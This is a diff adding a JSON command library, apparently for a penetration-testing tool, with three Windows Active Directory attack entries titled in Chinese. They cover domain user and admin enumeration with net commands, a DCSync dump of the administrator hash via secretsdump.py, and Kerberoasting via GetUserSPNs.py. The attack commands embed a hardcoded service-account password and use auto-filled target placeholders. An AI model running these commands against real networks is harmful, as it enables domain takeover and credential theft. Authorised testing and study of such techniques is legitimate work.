@@ -1,0 +1,26 @@
+[
+  {
+    "id": "k-10",
+    "category": "域渗透",
+    "os": "Windows",
+    "title": "域内信息收集",
+    "cmd": "net user /domain & net group \"Domain Admins\" /domain & net group \"Domain Controllers\" /domain",
+    "note": ""
+  },
+  {
+    "id": "k-11",
+    "category": "域渗透",
+    "os": "Windows",
+    "title": "DCSync 导出域管哈希",
+    "cmd": "secretsdump.py {DOMAIN}/svc_web:P@ssw0rd2026!@{IP} -just-dc-user administrator",
+    "note": "{IP} / {DOMAIN} 自动替换"
+  },
+  {
+    "id": "k-12",
+    "category": "域渗透",
+    "os": "Windows",
+    "title": "Kerberoasting",
+    "cmd": "GetUserSPNs.py {DOMAIN}/svc_web:P@ssw0rd2026! -dc-ip {IP} -request",
+    "note": ""
+  }
+]
